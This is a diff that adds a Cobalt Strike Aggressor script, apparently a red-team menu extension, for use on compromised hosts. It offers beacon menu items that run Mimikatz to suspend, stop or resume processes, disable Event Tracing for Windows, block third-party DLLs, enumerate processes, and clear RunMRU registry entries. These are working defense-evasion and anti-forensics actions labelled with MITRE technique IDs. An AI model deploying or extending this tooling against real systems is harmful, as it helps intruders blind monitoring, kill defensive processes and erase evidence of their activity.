@@ -1,0 +1,217 @@
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		  Menus 		############################
+
+#################################################
+
+#   ETW by n00bRage, n173hawk, syn
+
+#################################################
+
+
+#################################################
+
+#   Begin Process Enumeration (Cool Outflank Stuff)
+
+#################################################
+
+
+
+
+item "Enumerate Processes"{
+
+    local('$bid');
+        foreach $bid ($1){
+            psx($bid);
+      }
+
+    }
+
+
+#################################################
+
+#   End Process Enumeration (Cool Outflank Stuff)
+
+#################################################
+
+
+
+
+#################################################
+
+#   Begin Process Manipulation (Built in Mimikatz)
+
+#################################################
+
+
+#Mimikatz - Suspend Process
+item "Suspend Process  - T1057"{
+        prompt_text("Process to Suspend - PID:", "", lambda({
+                    bmimikatz($bids, "process::suspend /pid:" . $1);
+                }, $bids => $1));
+			}
+
+#Mimikatz - Stop Process
+       item "Stop Process  - T1057"{
+        prompt_text("Process to Stop - PID:", "", lambda({
+                    bmimikatz($bids, "process::stop /pid:" . $1);
+                }, $bids => $1));
+			}
+#Mimikatz - Resume Process
+       item "Resume Process  - T1057"{
+        prompt_text("Process to Resume - PID:", "", lambda({
+                    bmimikatz($bids, "process::resume /pid:" . $1);
+                }, $bids => $1));
+			}
+
+
+#################################################
+
+#   End Process Manipulation (Built in Mimikatz)
+
+#################################################
+
+
+
+#################################################
+
+#   Begin blocking ETW https://github.com/Soledge/BlockEtw
+
+#################################################
+
+# Block ETW
+item "Disable ETW in current process - T1054"{
+
+    local('$bid');
+        foreach $bid ($1){
+            blocketw($bid);
+      }
+
+    }
+
+
+#################################################
+
+#   End blocking ETW  https://github.com/Soledge/BlockEtw
+
+#################################################
+
+
+#################################################
+
+#   Begin blocking 3rd Party DLL's
+
+#################################################
+
+
+# Block ETW
+item "Block 3rd Party DLL's"{
+
+    local('$bid');
+        foreach $bid ($1){
+            blockdlls($bid);
+      }
+
+    }
+
+
+#################################################
+
+#   Begin blocking 3rd Party DLL's
+
+#################################################
+
+
+
+####################################################
+
+# Cleaning MRU Values by n00bRage, n173hawk, syn from 0xThirteen (Thanks, Steve!!!)
+
+###################################################
+
+menu "Cleaning MRU Test"{
+
+# Remove All MRU Values
+item "Clean All Values from MRU - T1070"{
+
+    local('$bid');
+        foreach $bid ($1){
+            cleanallmru($bid);
+      }
+    }
+
+
+# Remove Singular MRU Values
+item "Clean Single Value from MRU - T1070"{
+
+    local('$bid');
+        foreach $bid ($1){
+            clearsinglemruvalue($bid);
+      }
+    }
+
+item "Query MRU Values in Registry - T1012"{
+
+    local('$bid');
+        foreach $bid ($1){
+            querymru($bid);
+      }
+    }
+
+
+  } #End Menu
+
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		 Functions 		############################
+           
+           
+#################################################
+
+#   ETW
+
+#################################################          
+sub blocketw{
+blog($bid, "Blocking ETW with - https://github.com/Soledge/BlockEtw");
+bexecute_assembly($1, script_resource('exe/blocketw.exe'));
+}
+
+
+####################################################
+
+# Cleaning MRU Values by n00bRage, n173hawk, syn
+
+###################################################
+
+sub cleanallmru{
+blog($bid, "Removing all MRU Values with - https://github.com/0xthirteen/CleanRunMRU");
+bexecute_assembly($1, script_resource('exe/CleanRunMRU.exe'), "clearall");
+}
+
+sub clearsinglemruvalue{
+prompt_text("Which MRU Value do you want to remove?", "", lambda({
+bexecute_assembly($bids, script_resource('exe/CleanRunMRU.exe'), "command=$1");
+}, $bids => $1));
+}
+
+sub querymru{
+blog($bid, "Removing all MRU Values with - https://github.com/0xthirteen/CleanRunMRU");
+bexecute_assembly($1, script_resource('exe/CleanRunMRU.exe'), "query");
+}
+
+
+
+sub psx {
+    $bid = $1;
+
+    blog($bid, "Enumerating processes.");
+    bdllspawn($bid, script_resource("/exe/Outflank-PsX.dll"), "", "PsX", 5000, false);
+    return;
+}
+
+
+sub blockdlls {
+bblockdlls($1);
+}
